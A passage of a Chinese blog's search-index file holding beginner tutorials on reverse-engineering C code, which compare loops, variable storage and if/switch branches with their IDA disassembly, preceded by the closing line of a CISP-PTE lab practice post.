<p>然后用administrator用户进行登录远程桌面，从回收站中恢复文件读取key值，key{a2d3f4g5}</p>
<img src="/2022/06/26/Cisp-pte%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220626193208174.png" class title="image-20220626193208174">

]]></content>
      <categories>
        <category>证书</category>
        <category>cisp-pte</category>
      </categories>
      <tags>
        <tag>-考证 -cisp-pte -Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言代码逆向基础--循环结构</title>
    <url>/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="C语言代码逆向基础–循环结构"><a href="#C语言代码逆向基础–循环结构" class="headerlink" title="C语言代码逆向基础–循环结构"></a>C语言代码逆向基础–循环结构</h1><p>C语言循环结构有for循环、while循环、do循环和goto。</p>
<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>编写个简单的1-100累加和代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nNum = <span class="number">0</span>,nSum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(nNum=<span class="number">1</span>;nNum&lt;=<span class="number">100</span>;nNum++)</span><br><span class="line">	&#123;</span><br><span class="line">		nSum += nNum;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;nSum = %d \r\n&quot;</span>,nSum);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其反汇编代码如下，可以分为三个部分，第一部分为初始化部分，第二部分为修改循环变量的部分，第三部分为比较循环条件和循环体的部分。</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/image-20230306181014018.png" class title="image-20230306181014018">



<p>第一部分反汇编代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401028                 mov     [ebp+nNum], 0</span><br><span class="line">.text:0040102F                 mov     [ebp+nSum], 0</span><br><span class="line">.text:00401036                 mov     [ebp+nNum], 1</span><br><span class="line">.text:0040103D                 jmp     short loc_401048</span><br></pre></td></tr></table></figure>

<p>对nNum和nSum变量进行初始化，然后跳转到401048地址，其为循环部分判断条件，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401048 loc_401048:                             ; CODE XREF: _main_0+2D↑j</span><br><span class="line">.text:00401048                 cmp     [ebp+nNum], 64h ; &#x27;d&#x27;</span><br><span class="line">.text:0040104C                 jg      short loc_401059</span><br><span class="line">.text:0040104E                 mov     ecx, [ebp+nSum]</span><br><span class="line">.text:00401051                 add     ecx, [ebp+nNum]</span><br><span class="line">.text:00401054                 mov     [ebp+nSum], ecx</span><br><span class="line">.text:00401057                 jmp     short loc_40103F</span><br></pre></td></tr></table></figure>

<p>将nNum与100进行比较，jg指令(大于则跳转)不跳转，执行下面一系列指令，执行nSum+&#x3D;nNum得到nSum值，然后跳转到40103F地址执行相关指令，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040103F loc_40103F:                             ; CODE XREF: _main_0+47↓j</span><br><span class="line">.text:0040103F                 mov     eax, [ebp+nNum]</span><br><span class="line">.text:00401042                 add     eax, 1</span><br><span class="line">.text:00401045                 mov     [ebp+nNum], eax</span><br></pre></td></tr></table></figure>

<p>将nNum变量加1操作，然后再执行上面的比较代码，直到jg跳转到401059地址处的指令，输出nSum的值，结束程序。</p>
<h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;初始化变量</span><br><span class="line">mov xxx,xxx</span><br><span class="line"></span><br><span class="line">LOC_STEP:</span><br><span class="line">             ;修改循环变量</span><br><span class="line">LOC_CMP：</span><br><span class="line">             ;循环变量的判断</span><br><span class="line">             jxx LOC_ENDFO(符合则跳转到LOC_ENDFOR，否则执行循环体)</span><br><span class="line">             ;循环体</span><br><span class="line">             jmp LOC_STEP</span><br><span class="line">LOC_ENDFOR:</span><br></pre></td></tr></table></figure>



<h2 id="Do…while循环"><a href="#Do…while循环" class="headerlink" title="Do…while循环"></a>Do…while循环</h2><p>do…while循环体总是会被多执行一次。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nNum=<span class="number">1</span>,nSum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		nSum+=nNum;</span><br><span class="line">		nNum++;</span><br><span class="line">	&#125;<span class="keyword">while</span>(nNum&lt;=<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;nSum=%d \r\n&quot;</span>,nSum);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其反汇编代码如下</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/image-20230306194206227.png" class title="image-20230306194206227">

<p>观察下IDA生成的流程图</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/image-20230306194315142.png" class title="image-20230306194315142">

<p>反汇编关键代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401028                 mov     [ebp+nNum], 1</span><br><span class="line">.text:0040102F                 mov     [ebp+nSum], 0</span><br><span class="line">.text:00401036</span><br><span class="line">.text:00401036 loc_401036:                             ; CODE XREF: _main_0+3C↓j</span><br><span class="line">.text:00401036                 mov     eax, [ebp+nSum]</span><br><span class="line">.text:00401039                 add     eax, [ebp+nNum]</span><br><span class="line">.text:0040103C                 mov     [ebp+nSum], eax</span><br><span class="line">.text:0040103F                 mov     ecx, [ebp+nNum]</span><br><span class="line">.text:00401042                 add     ecx, 1</span><br><span class="line">.text:00401045                 mov     [ebp+nNum], ecx</span><br><span class="line">.text:00401048                 cmp     [ebp+nNum], 64h ; &#x27;d&#x27;</span><br><span class="line">.text:0040104C                 jle     short loc_401036</span><br><span class="line">.text:0040104E                 mov     edx, [ebp+nSum]</span><br></pre></td></tr></table></figure>

<p>先对变量nNum和nSum进行初始化，然后执行nSum+&#x3D;nNum得到nSum的值，并且将nNum的值加1，然后jle指令(小于等于)与100进行比较，符合则跳转到401036地址处执行循环体，否则就输出nSum的值并退出程序。</p>
<h3 id="结构-1"><a href="#结构-1" class="headerlink" title="结构"></a>结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;初始化变量</span><br><span class="line">LOC_DO：</span><br><span class="line">       ;执行循环体</span><br><span class="line">       ;修改循环变量</span><br><span class="line">       cmp xxx,xxx ;循环变量的比较</span><br><span class="line">       jxx LOC_DO(符合即再次执行循环体，否则跳出循环)</span><br></pre></td></tr></table></figure>



<h2 id="While结构"><a href="#While结构" class="headerlink" title="While结构"></a>While结构</h2><p>while循环和do循环之间的区别是再进入循环体之前要先进行一次条件判断；而do循环是先执行循环体再进行判断，会导致多执行一次循环体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nNum=<span class="number">1</span>,nSum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(nNum&lt;=<span class="number">100</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		nSum+=nNum;</span><br><span class="line">		nNum++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;nSum=%d \r\n&quot;</span>,nSum);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其反汇编关键代码如下</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/image-20230306195837136.png" class title="image-20230306195837136">

<p>生成流程图如下</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/image-20230306195931794.png" class title="image-20230306195931794">



<p>反汇编关键代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401028                 mov     [ebp+nNum], 1</span><br><span class="line">.text:0040102F                 mov     [ebp+nSum], 0</span><br><span class="line">.text:00401036</span><br><span class="line">.text:00401036 loc_401036:                             ; CODE XREF: _main_0+3E↓j</span><br><span class="line">.text:00401036                 cmp     [ebp+nNum], 64h ; &#x27;d&#x27;</span><br><span class="line">.text:0040103A                 jg      short loc_401050</span><br><span class="line">.text:0040103C                 mov     eax, [ebp+nSum]</span><br><span class="line">.text:0040103F                 add     eax, [ebp+nNum]</span><br><span class="line">.text:00401042                 mov     [ebp+nSum], eax</span><br><span class="line">.text:00401045                 mov     ecx, [ebp+nNum]</span><br><span class="line">.text:00401048                 add     ecx, 1</span><br><span class="line">.text:0040104B                 mov     [ebp+nNum], ecx</span><br><span class="line">.text:0040104E                 jmp     short loc_401036</span><br><span class="line">.text:00401050 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401050</span><br><span class="line">.text:00401050 loc_401050:                             ; CODE XREF: _main_0+2A↑j</span><br><span class="line">.text:00401050                 mov     edx, [ebp+nSum]</span><br></pre></td></tr></table></figure>

<p>前面对两个变量进行初始化，与do循环的区别是先进行判断比较，使用cmp指令将nNum和100进行比较，jg(大于)指令符合的话就跳转到401050地址的输出nSum值，否则就执行循环体。</p>
<h3 id="结构-2"><a href="#结构-2" class="headerlink" title="结构"></a>结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;初始化变量</span><br><span class="line"></span><br><span class="line">LOC_WHILE：</span><br><span class="line">         cmp xxx,xxx;比较循环变量</span><br><span class="line">         jxx LOC_WHILEEND</span><br><span class="line">         ;循环体</span><br><span class="line">         jmp LOC_WHILE</span><br><span class="line">LOC_SHILEEND:</span><br></pre></td></tr></table></figure>



<p><strong>在这三种循环结构中，循环效率从高到低排序：DO&gt;while&gt;for</strong></p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>C/C++</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-逆向 -C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言代码逆向基础-变量在内存中的位置和访问方式</title>
    <url>/2023/03/08/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="C语言代码逆向基础-变量在内存中的位置和访问方式"><a href="#C语言代码逆向基础-变量在内存中的位置和访问方式" class="headerlink" title="C语言代码逆向基础-变量在内存中的位置和访问方式"></a>C语言代码逆向基础-变量在内存中的位置和访问方式</h1><p>在程序中，包含全局变量、局部变量和静态变量。全局变量和局部变量的最大区别是生命周期不同，</p>
<h2 id="全局变量和局部变量的区别"><a href="#全局变量和局部变量的区别" class="headerlink" title="全局变量和局部变量的区别"></a>全局变量和局部变量的区别</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int a=0;</span><br><span class="line">int b=1;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int c=3;</span><br><span class="line">	int d=4;</span><br><span class="line">	scanf(&quot;%d,%d&quot;,&amp;c,&amp;d);</span><br><span class="line">	printf(&quot;%d %d\r\n&quot;,c,d);</span><br><span class="line">	scanf(&quot;%d,%d&quot;,&amp;a,&amp;b);</span><br><span class="line">	printf(&quot;%d %d\r\n&quot;,a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反汇编关键代码：</p>
<img src="/2023/03/08/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F/image-20230308101618149.png" class title="image-20230308101618149">

<p>可以观察得到，全局变量和局部变量的特征：</p>
<p><strong>全局变量</strong></p>
<ul>
<li>所在地址为数据区，生命周期与所在模块一致</li>
<li>使用立即数间接访问</li>
<li>先定义变量在低地址，后定义变量在高地址</li>
</ul>
<p><strong>局部变量</strong></p>
<ul>
<li>所在地区为栈区，生命周期与 所在函数作用域一致</li>
<li>使用ebp或者esp间接访问</li>
<li>先定义变量在低地址，后定义变量在高地址</li>
</ul>
<h2 id="局部静态变量"><a href="#局部静态变量" class="headerlink" title="局部静态变量"></a>局部静态变量</h2><p>局部静态变量和全局变量都保存在执行文件中的数据区中，且生命周期都相同。如果函数被频繁调用，由于C++语法规定局部静态变量指被初始化一次，那么如何保证编译器每次进入函数体中赋值操作只执行一次？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showStatic</span><span class="params">( <span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> a=number;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d \r\n&quot;</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		showStatic(i);<span class="comment">//循环调用局部静态变量，每次传入不同值</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行程序发现每次输出都为0</p>
<img src="/2023/03/08/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F/image-20230308102945748.png" class title="image-20230308102945748">

<p>关键反汇编代码如下：</p>
<img src="/2023/03/08/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F/image-20230308103936295.png" class title="image-20230308103936295">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor     eax, eax</span><br></pre></td></tr></table></figure>

<p>对eax进行异或指令，eax清空。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     al, byte_42AE5C</span><br></pre></td></tr></table></figure>

<p>取地址42AE5C处1字节数据到al中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and     eax, 1</span><br><span class="line">test    eax, eax</span><br></pre></td></tr></table></figure>

<p>将eax与数值1做位与运算，eax最终结果只能是0或1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jnz     short loc_40104E</span><br><span class="line">mov     cl, byte_42AE5C</span><br><span class="line">or      cl, 1</span><br><span class="line">mov     byte_42AE5C, cl</span><br><span class="line">mov     edx, [ebp+arg_0]</span><br><span class="line">mov     dword_42AE60, edx</span><br></pre></td></tr></table></figure>

<p>比较eax,不等于0则执行跳转，等于0则跳转40104E处；通过位运算将标志中的以为数据置1，以此来判断是否已经被初始化。</p>
<h2 id="堆变量"><a href="#堆变量" class="headerlink" title="堆变量"></a>堆变量</h2><p>使用malloc与new实现堆空间的申请，返回的数据便是申请的堆堆空间地址，使用free和delete完成堆空间的释放。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * pCharMalloc = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">char</span> * pCharNew = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pCharMalloc != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span> [] pCharNew;</span><br><span class="line">		pCharNew = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(pCharMalloc != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(pCharMalloc);</span><br><span class="line">		pCharMalloc = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>申请内存空间反汇编关键代码如下：</p>
<img src="/2023/03/08/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F/image-20230308125551446.png" class title="image-20230308125551446">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401028                 push    0Ah             ; Size</span><br><span class="line">.text:0040102A                 call    _malloc</span><br><span class="line">.text:0040102F                 add     esp, 4</span><br></pre></td></tr></table></figure>

<p>先使用push指令开辟0Ah字节(10字节)，然后调用Malloc函数，在平衡esp指针；new指令也是先使用push指令申请空间，然后再调用函数，最后平衡指针。</p>
<p>释放内存空间反汇编代码如下：</p>
<img src="/2023/03/08/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E8%AE%BF%E9%97%AE%E6%96%B9%E5%BC%8F/image-20230308130640408.png" class title="image-20230308130640408">]]></content>
      <categories>
        <category>逆向分析</category>
        <category>C/C++</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-逆向 -C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言代码逆向基础--分支结构</title>
    <url>/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="C语言代码逆向基础–分支结构"><a href="#C语言代码逆向基础–分支结构" class="headerlink" title="C语言代码逆向基础–分支结构"></a>C语言代码逆向基础–分支结构</h1><p>C语言中有两种分支结构，if…else…结构和switch…case…default…结构</p>
<h2 id="if-x2F-else结构分支"><a href="#if-x2F-else结构分支" class="headerlink" title="if&#x2F;else结构分支"></a>if&#x2F;else结构分支</h2><p>写一个简单的C语言例子，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">1</span>,c=<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">  &#123;</span><br><span class="line">	  <span class="built_in">printf</span>(<span class="string">&quot;%d \r\n&quot;</span>,a);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(b&lt;=c)</span><br><span class="line">  &#123;</span><br><span class="line">	  <span class="built_in">printf</span>(<span class="string">&quot;%d \r\n&quot;</span>,b);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">	  <span class="built_in">printf</span>(<span class="string">&quot;%d \r\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用VC对其进行编译，使用IDA打开DeBUG文件夹下的可执行文件，IDA自动识别main函数。</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/image-20230306161200268.png" class title="image-20230306161200268">



<p>我们来看关键的反汇编代码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401028                 mov     [ebp+var_4], 0</span><br><span class="line">.text:0040102F                 mov     [ebp+var_8], 1</span><br><span class="line">.text:00401036                 mov     [ebp+var_C], 2</span><br></pre></td></tr></table></figure>

<p>以上三行反汇编代码为对定义变量的初始化，其余反汇编代码可以分为三部分来观察，前两段代码都有<strong>cmp&#x2F;jxx&#x2F;printf &#x2F;jmp</strong>这些指令特征，这就是if…else…的特征所在。</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/image-20230306161702543.png" class title="image-20230306161702543">

<p>观察IDA绘制的反汇编流程图</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/image-20230306162145599.png" class title="image-20230306162145599">

<p>在反汇编中，C语言代码中”&gt;”对应的是jle(小于等于则跳转),”&lt;&#x3D;”在反汇编中对应的是jg(大于则跳转)，反汇编代码与C语言中比较是相反的。只有当jxx指令没有发生跳转，才执行jxx到jmp之间的指令，否则会进行跳转。</p>
<p>简单阐述一下上图：</p>
<p>C语言的if判断反汇编代码，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jle     short loc_401058</span><br><span class="line">.text:00401045                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:00401048                 push    ecx</span><br><span class="line">.text:00401049                 push    offset Format   ; &quot;%d \r\n&quot;</span><br><span class="line">.text:0040104E                 call    _printf</span><br><span class="line">.text:00401053                 add     esp, 8</span><br><span class="line">.text:00401056                 jmp     short loc_401084</span><br></pre></td></tr></table></figure>

<p>这里如果jle(小于等于)符合条件，则跳转到loc_401058，执行else if判断语句，若不符合则执行jle到jmp之间的指令，并最后跳转到401084地址，代表这判断结束，程序结束。</p>
<p>else if判断反汇编代码，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040105E                 jg      short loc_401073</span><br><span class="line">.text:00401060                 mov     eax, [ebp+var_8]</span><br><span class="line">.text:00401063                 push    eax</span><br><span class="line">.text:00401064                 push    offset Format   ; &quot;%d \r\n&quot;</span><br><span class="line">.text:00401069                 call    _printf</span><br><span class="line">.text:0040106E                 add     esp, 8</span><br><span class="line">.text:00401071                 jmp     short loc_401084</span><br></pre></td></tr></table></figure>

<p>如果jg(大于)符合条件，则跳转到401073地址处执行else语句，否则就执行其语句，最后依然跳转到401084地址，退出程序。</p>
<h3 id="结构小结"><a href="#结构小结" class="headerlink" title="结构小结"></a>结构小结</h3><p>if…else…结构与反汇编代码的对应结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 初始化变量</span><br><span class="line">mov xxxx,xxxx</span><br><span class="line">mov xxxx,xxxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_if:</span><br><span class="line">    ;比较跳转</span><br><span class="line">    cmp xxxx,xxxx</span><br><span class="line">    jxx _else_if</span><br><span class="line">    ;一系列指令（不符合执行一系列指令，符合即调转else_if）</span><br><span class="line">    ......</span><br><span class="line">    jmp _if_else结束位置</span><br><span class="line">_else_if:</span><br><span class="line">    ; 比较跳转</span><br><span class="line">    mov xxx,xxx</span><br><span class="line">    cmp xxx,xxx</span><br><span class="line">    jxx _else（不符合执行一系列指令，符合即调转_else）</span><br><span class="line">    .....</span><br><span class="line">    jmp _if_else结束位置</span><br><span class="line">_else:</span><br><span class="line">    ;一系列指令</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>



<h2 id="switch结构分支"><a href="#switch结构分支" class="headerlink" title="switch结构分支"></a>switch结构分支</h2><p>编写个简单的Switch结构分支</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> nNum=<span class="number">0</span>;</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nNum);</span><br><span class="line">   <span class="keyword">switch</span>(nNum)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	   &#123;</span><br><span class="line">		   <span class="built_in">printf</span>(<span class="string">&quot;1 \r\n&quot;</span>);</span><br><span class="line">		   <span class="keyword">break</span>;</span><br><span class="line">	   &#125;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	   &#123;</span><br><span class="line">		   <span class="built_in">printf</span>(<span class="string">&quot;2 \r\n&quot;</span>);</span><br><span class="line">		   <span class="keyword">break</span>;</span><br><span class="line">	   &#125;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">	   &#123;</span><br><span class="line">		   <span class="built_in">printf</span>(<span class="string">&quot;3 \r\n&quot;</span>);</span><br><span class="line">		   <span class="keyword">break</span>;</span><br><span class="line">	   &#125;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">	   &#123;</span><br><span class="line">		   <span class="built_in">printf</span>(<span class="string">&quot;4 \r\n&quot;</span>);</span><br><span class="line">		   <span class="keyword">break</span>;</span><br><span class="line">	   &#125;</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">	   &#123;</span><br><span class="line">		   <span class="built_in">printf</span>(<span class="string">&quot;default \r\n&quot;</span>);</span><br><span class="line">		   <span class="keyword">break</span>;</span><br><span class="line">	   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接来看下关键代码，如下</p>
